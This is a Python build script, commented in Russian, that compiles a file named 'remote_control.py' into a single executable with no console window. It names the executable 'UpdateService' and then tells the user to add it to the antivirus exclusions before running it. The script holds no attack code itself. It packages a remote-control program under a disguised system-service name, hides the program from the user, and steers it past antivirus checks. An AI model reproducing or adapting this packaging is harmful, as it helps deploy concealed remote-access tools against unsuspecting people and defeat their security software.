import os
import subprocess
import sys
import shutil

print("Начинаю сборку с PyInstaller...")

try:
    result = subprocess.run([sys.executable, '-m', 'PyInstaller', '--version'], capture_output=True, text=True)
    if result.returncode != 0:
        raise FileNotFoundError
    print(f"PyInstaller версия: {result.stdout.strip()}")
except (FileNotFoundError, Exception):
    print("Ошибка: PyInstaller не установлен!")
    print("Установите: pip install pyinstaller")
    sys.exit(1)

if os.path.exists('dist'):
    shutil.rmtree('dist', ignore_errors=True)
if os.path.exists('build'):
    shutil.rmtree('build', ignore_errors=True)
if os.path.exists('UpdateService.spec'):
    os.remove('UpdateService.spec')

pyinstaller_args = [
    sys.executable,
    '-m',
    'PyInstaller',
    '--onefile',
    '--noconsole',
    '--name=UpdateService',
    '--distpath=dist',
    '--workpath=build',
    '--clean',
]

if os.path.exists('icon.ico'):
    pyinstaller_args.append('--icon=icon.ico')

pyinstaller_args.append('remote_control.py')

print("\nЗапуск компиляции...")
print(f"Команда: {' '.join(pyinstaller_args)}\n")

try:
    result = subprocess.run(pyinstaller_args, check=True)
    
    print("\n" + "="*50)
    print("Сборка завершена успешно!")
    
    exe_path = os.path.join('dist', 'UpdateService.exe')
    if os.path.exists(exe_path):
        size = os.path.getsize(exe_path) / 1024 / 1024
        print(f"Файл: {exe_path}")
        print(f"Размер: {size:.1f} MB")
        print("\nВажно: Добавьте файл в исключения антивируса перед запуском!")
    else:
        print("Предупреждение: Файл не найден в ожидаемом месте")
        
except subprocess.CalledProcessError as e:
    print(f"\nОшибка сборки: {e}")
    sys.exit(1)
except KeyboardInterrupt:
    print("\nСборка прервана пользователем")
    sys.exit(1)
